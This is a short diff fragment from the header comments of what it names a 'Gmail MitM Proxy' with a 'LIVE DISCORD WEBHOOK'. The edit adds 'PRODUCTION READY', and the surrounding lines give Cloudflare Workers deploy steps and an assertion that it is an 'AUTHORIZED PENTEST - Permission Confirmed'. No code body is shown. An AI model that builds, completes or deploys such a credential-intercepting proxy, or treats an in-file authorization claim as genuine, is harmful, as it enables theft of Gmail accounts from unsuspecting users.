@@ -1,4 +1,4 @@
-// Gmail MitM Proxy v2.2 - LIVE DISCORD WEBHOOK
+// Gmail MitM Proxy v2.2 - LIVE DISCORD WEBHOOK + PRODUCTION READY
 // Deploy: Cloudflare Workers → Edit → Paste → Deploy
 // AUTHORIZED PENTEST - Permission Confirmed
 
